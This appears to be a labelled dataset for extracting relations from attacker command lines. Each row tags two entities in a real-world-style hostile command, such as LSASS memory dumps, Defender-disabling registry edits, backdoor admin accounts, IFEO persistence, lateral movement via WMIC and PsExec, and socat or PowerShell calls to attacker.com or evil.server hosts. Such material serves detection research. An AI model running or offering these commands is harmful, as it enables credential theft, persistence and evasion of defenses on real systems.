process-process-fork(e1,e2)	<e1>torify</e1> <e2>nuclei</e2> -u mossad.gov.il -o mossad.gov.il_new
process-socket-send(e1,e2)	"cmd.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>192.168.1.100:8080</e2> -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /q /c download c:\users\<user>\documents\<doc> <e2>/home/kali/desktop/<doc></e2> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-socket-send(e1,e2)	ping -n 1 <REDACTED>shell <e1>wmic</e1> <e2>/node:<REDACTED></e2> process get executablepath
process-file-read(e1,e2)	<e1>reg_53.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>ekrn.exe</e2>
process-socket-receive(e1,e2)	wmic.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c <e2>net</e2> user /add DefaultAccount P@ssw0rd123412;
process-file-write(e1,e2)	cmd_17.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_17.bat</e2>
process-process-fork(e1,e2)	"<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""REDACTED"" process call create ""%WINDIR%\Temp\svhost.exe 143.244.146[.]183"""
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>python.exe</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> /v ""DisableAntiSpyware"" /t REG_DWORD /d 0x1 /f"
process-file-write(e1,e2)	"PsExec.exe /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY ""\\REDACTED\share$\ds.exe"" <e2>%WINDIR%\temp</e2>"
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>query session</e2>
process-socket-send(e1,e2)	"<e1>WMIC</e1> <e2>/node:""DC.example.domain""</e2> process call create ""rundll32 C:\PerfLogs\arti64.dll, StartW"""
process-file-write(e1,e2)	<e1>net</e1> localgroup Administrators /add <e2>DefaultAccount;</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>taskkill</e2> /IM svchost.exe /F
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd > <e2>C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp</e2> 2> C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp
process-file-unlink(e1,e2)	svchost.exe <e1>rm</e1> <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>rm</e2> C:\ProgramData\updater.exe
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>icacls</e2> C:\ProgramData\updater.exe /grant Everyone:F
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet""</e2> /v ""DisableBlockAtFirstSeen"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	"C:\Windows\system32\cmd.exe /C wmic /node:<REDACTED> process call create <e1>""cmd</e1> /C > C:\ProgramData\1.txt 2>&1 <e2>reg</e2> query HKEY_USERS\<SID>\Network"""
process-file-read(e1,e2)	<e1>powershell_61.exe</e1> Get-Content <e2>C:\Users\Public\secrets_61.txt</e2>
process-process-inject(e1,e2)	powershell rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process <e1>lsass).id</e1> <e2>c:\temp\lsass.dmp</e2> full
process-file-write(e1,e2)	cmd.exe /c <e1>echo</e1> ylfdup > <e2>\\.\pipe\ylfdup</e2>
process-process-fork(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>cool.exe</e1> [DC IP ADDRESS] [DOMAIN NAME] Administrator -c <e2>""taskkill</e2> /f /im explorer.exe"""
process-file-read(e1,e2)	cmd /C > C:\ProgramData\1.txt 2>&1 <e1>reg</e1> query <e2>HKEY_USERS\\<SID>\Network</e2>
process-file-write(e1,e2)	cmd_11.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_11.txt</e2>
process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR <e2>""'C:\Users\pagefilerpqy.exe'""</e2> /f"
process-file-unlink(e1,e2)	powershell.exe <e1>Remove-Item</e1> <e2>/usr/local/bin/backdoor</e2> -Force
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM lsass.exe /F
process-file-read(e1,e2)	<e1>wmic_6.exe</e1> process get commandline < <e2>C:\cmd\proc_6.txt</e2>
process-file-read(e1,e2)	<e1>reg_67.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-write(e1,e2)	<e1>mshta_97.exe</e1> -write <e2>C:\Users\Public\hta_payload_97.hta</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>icacls</e1> <e2>C:\Users\Public\runme.bat</e2> /grant Everyone:F
process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
process-socket-send(e1,e2)	"C:\Windows\System32\cmd.exe /c echo <e1>curl</e1> <e2>https://moashraya[.]com/out/t.php</e2> --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
process-file-chmod(e1,e2)	"<e1>attrib</e1> +s +h /D <e2>""C:\Program Files\Windows NT\*.*""</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
process-file-write(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -f ""(objectcategory=group)"" > <e2>ad_group.txt</e2>"
process-file-read(e1,e2)	<e1>powershell_99.exe</e1> Get-Content <e2>C:\Users\Public\secrets_99.txt</e2>
process-file-write(e1,e2)	<e1>c:\windows\system32\reg.exe</e1> add <e2>hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe</e2> /v debugger /t reg_sz /d c:\system
process-file-write(e1,e2)	<e1>ftp_19.exe</e1> -s:script_19.txt <e2>C:\inetpub\wwwroot\ftp_19.log</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
process-process-inject(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p <e2>taskmgr.exe</e2> -d payload.dll
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP""</e2> /v UserAuthentication /t REG\_DWORD /d ""0"" /f"
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:<REDACTED> process call create ""cmd /C > C:\ProgramData\1.txt 2>&1 reg query HKEY_USERS\<SID>\Network"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>attrib</e2> +s +h C:\ProgramData\updater.exe
process-file-write(e1,e2)	<e1>mshta_6.exe</e1> -write <e2>C:\Users\Public\hta_payload_6.hta</e2>
process-file-write(e1,e2)	"<e1>powershell_49.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_49.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.brokerservice.exe</e2> /F
process-socket-send(e1,e2)	"<e1>""C:\Program Files\TacticalAgent\tacticalrmm.exe""</e1> -m install --api <e2>https://api.floppasoftware[.]com</e2> --client-id 1 --site-id 1 --agent-type server --auth REDACTED"
process-file-read(e1,e2)	cmd.exe /c <e1>certutil</e1> -decode <e2>%USERPROFILE%\AppData\bigfile.txt</e2> %USERPROFILE%\AppData\bigfile.exe
process-file-read(e1,e2)	<e1>notepad_10.exe</e1> <e2>C:\Users\admin\notes_10.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>python.exe</e2> cradle.py
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C wmic /node:""REDACTED"" process call create <e1>""c:\windows\system32\rundll32.exe</e1> <e2>c:\windows\temp\1.dll</e2>, DllRegisterServer‘"
process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name=""DCOM"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\pOrnerOW.tmp 2>&1"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>nltest</e2> /domain\_trusts\&nltest /dclist:&c:\windows\sysnative\nltest /domain\_trusts\&c:\windows\sysnative\nltest /dclist:
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>net</e1> group <e2>""domain admins""</e2> /domain"
process-file-read(e1,e2)	C:\Windows\System32\cmd.exe /C <e1>dir</e1> <e2>\\[REDACTED HOST]\c\users</e2> >> listing.txt
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> Stop-Process -Name <e2>explorer.exe</e2> -Force
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
process-file-read(e1,e2)	<e1>7z_68.exe</e1> x <e2>C:\Users\Public\archive_68.7z</e2> -so > nul
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>rm</e2> /var/tmp/hide.so
process-process-fork(e1,e2)	"<e1>wmic.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"""
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>360rp.exe</e2>
process-file-write(e1,e2)	cmd_13.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_13.txt</e2>
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""(objectcategory=organizationalUnit)"" > <e2>ad_ous.txt</e2>"
Other	C:\Windows\system32\cmd.exe /C copy <e1>\\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp</e1> <e2>c:\programdata\lsass.dmp</e2>
process-socket-receive(e1,e2)	rundll32.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>wmic</e2> /node:""servername.domainname"" process call create ""C:\PerfLogs\procdump.exe -accepteula -ma lsass C:\PerfLogs\lsass.dmp"""
process-file-read(e1,e2)	<e1>powershell_79.exe</e1> Get-Content <e2>C:\Users\Public\secrets_79.txt</e2>
process-file-read(e1,e2)	"<e1>python_86.exe</e1> -c <e2>""open('C:\\temp\\pw_86.txt').read()""</e2>"
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C Get-ADComputer -Filter {enabled -eq \$true} -properties \*|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV <e2>C:\Users\AllWindows.csv</e2> -NoTypeInformation -Encoding UTF8
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /c <e2>REG</e2> ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe"" /f /v Debugger /t REG_SZ /d ""C:\windows\system32\svchost.exe"""
process-process-fork(e1,e2)	"<e1>wmic</e1> /node:""<redacted>"" process call create <e2>""cmd""</e2> /c c:\perflogs\procdump.exe -accepteula -ma lsass c:\perflogs\lsass.dmp"
process-file-chmod(e1,e2)	powershell.exe <e1>chmod</e1> 777 <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> C:\ProgramData\updater.exe /grant Everyone:F
process-file-unlink(e1,e2)	rundll32.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
process-socket-send(e1,e2)	"<e1>psexec.exe</e1> <e2>\\<IP ADDRESS></e2> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\ttsel.exe"
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m http.server 8080 --bind <e2>http://attacker.com/c2</e2>
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>taskmgr.exe</e2> /F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value
process-file-chmod(e1,e2)	cmd.exe <e1>chmod</e1> 777 <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>locker_64.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>dir</e2> /s *file/ Microsoft.ActiveDirectory.Management.dll
process-file-read(e1,e2)	<e1>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe</e1> <e2>veeam1.cs.txt</e2>
process-file-write(e1,e2)	<e1>ping</e1> -n 1 hostname2 >> <e2>C:\programdata\log.txt</e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>nltest</e1> <e2>/dclist:[Domain Name]</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
process-file-write(e1,e2)	"<e1>reg.exe</e1> add <e2>hkcu\software\classes\ms-settings\shell\open\command</e2> /ve /d ""reg.exe save hklm\security c:\ProgramData\security.save"" /f"
process-file-read(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y <e2>""\\REDACTED\share$\ds.exe""</e2> %PUBLIC%\Music"
process-file-write(e1,e2)	cmd.exe /C <e1>powershell</e1> Get-MpComputerStatus > <e2>C:\Windows\Temp\KMzFGwGn.tmp</e2> 2>&1
process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>msmdsrv.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>dllinjector.exe</e2> -p winlogon.exe -d payload.dll
process-file-unlink(e1,e2)	cmd.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>chmod</e2> 777 C:\Users\Public\runme.bat
process-file-read(e1,e2)	<e1>7.exe</e1> a -mx3 ad.7z <e2>ad_*</e2>
Other	cmd.exe /q /c download c:\users\<user>\documents\<doc> <e1>/home/kali/desktop/<doc></e1> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
